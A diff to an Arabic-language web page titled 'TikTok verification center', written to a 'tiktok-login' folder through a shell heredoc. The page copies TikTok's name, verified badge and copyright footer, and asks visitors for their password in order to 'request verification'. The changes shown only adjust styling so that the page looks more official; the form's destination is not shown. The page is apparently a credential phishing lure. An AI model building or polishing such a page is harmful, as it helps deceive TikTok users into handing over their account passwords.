@@ -1,3 +1,4 @@
+cat <<'EOF' > ~/tiktok-login/index.html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -6,20 +7,20 @@
   <title>مركز توثيق تيك توك</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; padding: 0 20px; }
+    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; padding: 0 20px; display: flex; flex-direction: column; }
     .header { text-align: center; padding: 48px 0 10px; }
-    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 5px; }
+    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 15px; }
     
-    /* تنسيق الشارة الزرقاء تحت الكلمة مباشرة */
+    /* تنسيق الشارة الزرقاء الدائرية والمتوسطة */
     .badge-container { display: flex; justify-content: center; margin-bottom: 25px; }
-    .verified-badge { width: 32px; height: 32px; fill: #20d5ec; }
+    .verified-badge { width: 32px; height: 32px; fill: #20d5ec; border-radius: 50%; background-color: #fff; padding: 2px; }
 
     h1 { font-size: 26px; font-weight: 700; margin: 10px 0 16px; text-align: center; }
     
     /* الوصف الجديد بأسلوب شركة تيك توك الرسمي */
     .warning { font-size: 15.5px; color: #d0d0d0; text-align: center; line-height: 1.45; margin: 0 auto 36px; max-width: 380px; }
     
-    .form { max-width: 380px; margin: 0 auto; }
+    .form { max-width: 380px; margin: 0 auto; flex: 1; }
     .input-field { 
       width: 100%; 
       height: 54px; 
@@ -51,7 +52,10 @@
     .toggle-password svg { width: 20px; height: 20px; fill: currentColor; }
     
     .btn { width: 100%; height: 54px; margin: 28px 0 20px; background: #fe2c55; color: #fff; border: none; border-radius: 999px; font-size: 17px; font-weight: 700; cursor: pointer; }
-    .footer { text-align: center; color: #444; font-size: 12px; padding: 40px 0; }
+    
+    /* تنسيق أسفل الصفحة المتناسق */
+    .footer { text-align: center; color: #444; font-size: 12px; padding: 40px 0; width: 100%; max-width: 380px; margin: 0 auto; border-top: 1px solid #1a1a1a; }
+    .footer-text { display: block; margin-bottom: 5px; }
   </style>
 </head>
 <body>
@@ -81,7 +85,10 @@
     <button class="btn" type="submit">إرسال طلب التوثيق</button>
   </form>
 
-  <div class="footer">© TikTok - مركز المساعدة والدعم 2026</div>
+  <div class="footer">
+    <span class="footer-text">© TikTok - مركز المساعدة والدعم 2026</span>
+    <span class="footer-text">جميع الحقوق محفوظة</span>
+  </div>
 
   <script>
     const passwordInput = document.getElementById('password');
@@ -109,3 +116,4 @@
   </script>
 </body>
 </html>
+EOF
